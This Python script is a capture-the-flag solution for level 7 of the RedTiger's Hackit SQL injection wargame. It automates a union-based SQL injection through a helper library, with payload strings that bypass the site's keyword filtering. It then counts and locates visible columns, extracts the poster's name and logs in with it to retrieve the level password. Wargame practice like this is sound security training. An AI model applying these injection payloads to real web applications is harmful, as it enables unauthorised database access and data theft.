#!/usr/bin/env python3
import tigers as tg
import tiger_cookies


def main():
    """
    Hard Error Based Sqli with filtering

    Target: Get the name of the user who posted the news about google.
    Table: level7_news column: autor

    Restrictions: no comments, no substr, no substring, no ascii, no mid, no like
    """
    url = "https://redtiger.labs.overthewire.org/level7.php"
    table_name = 'level7_news'
    finds = ['autor']  # What we are finding
    pass_r = 'The password for the next level is: '
    level = 'level7login'
    method = 'post'
    inj_param = 'search'
    other_param = {'dosearch': 'search!'}

    cooks = tiger_cookies.check_cookies(level)
    cook = dict(level7login=cooks[level])

    # Search for error
    payload = "google%'"
    p = tg.SqlInjection(url, cook, method, inj_param, payload,
                        check_clear=pass_r, other_param=other_param)
    response = p.my_request()

    # Counting the number of columns
    p.payload = f"google%%') union select %s FROM {table_name} news, level7_texts text where ('%%'='"
    if not (columns := p.count_columns_union()):
        return False

    # Search for visible columns
    p.payload = f"google%%') UNION SELECT %s FROM {table_name} news, level7_texts text where ('%%'='"
    resp, visible = p.find_visible_columns(columns)
    if not visible:
        return False

    # Search for desired data
    if not (keys := p.find_param(finds, resp, columns)):
        return False

    # ToDo one key upper, need to find all keys and test them
    keys.append('TestUserforg00gle')
    # Authorization
    for k in keys:
        p.other_param = {'username': k, 'try': 'Check!'}
        p.inj_param = ''
        response = p.my_request()
        if 'flag' in response:
            # Еxtracting data from html
            passw = p.extract_pass(response)
            tiger_cookies.save_cookies(cooks, level, passw)


if __name__ == '__main__':
    main()
